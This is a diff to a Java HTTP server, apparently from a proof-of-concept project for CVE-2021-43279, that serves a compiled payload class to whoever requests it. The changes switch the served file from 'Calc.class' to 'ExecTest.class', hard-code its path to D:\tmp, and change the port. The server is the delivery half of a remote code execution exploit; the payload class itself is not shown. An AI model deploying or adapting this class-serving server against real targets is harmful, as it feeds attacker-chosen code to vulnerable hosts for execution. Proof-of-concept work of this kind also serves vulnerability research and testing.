@@ -15,7 +15,9 @@ import java.net.InetSocketAddress;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Set;
-import org.apache.commons.lang3.StringUtils;
+
+import org.apache.commons.lang.StringUtils;
+
 
 /**
  * 解析http协议，输出http请求体
@@ -25,7 +27,7 @@ import org.apache.commons.lang3.StringUtils;
 public class HTTPServer {
 
     public static String filePath;
-    public static int PORT = 8080;
+    public static int PORT = 8000;
     public static String contentType;
 
     public static void main(String[] args) throws IOException {
@@ -35,7 +37,7 @@ public class HTTPServer {
     public static void run(String[] args) {
         int port = PORT;
         String context = "/";
-        String clazz = "Calc.class";
+        String clazz = "ExecTest.class";
         if (args != null && args.length > 0) {
             port = Integer.parseInt(args[0]);
             context = args[1];
@@ -96,7 +98,9 @@ public class HTTPServer {
                 }
                 System.out.println(stringBuilder.toString());
 
-                byte[] bytes = Files.toByteArray(new File(System.getProperty("user.dir")+ "\\CVE-2021-43279\\src\\main\\resources\\util.ExecTest.class"));
+//                byte[] bytes = Files.toByteArray(new File(filePath == null ? HTTPServer.class.getClassLoader().getResource(clazz).getPath() : filePath));
+
+                byte[] bytes = Files.toByteArray(new File("D:\\tmp\\ExecTest.class"));
                 System.out.println(new String(bytes, 0, bytes.length));
                 // send response
                 responseBody.write(bytes);
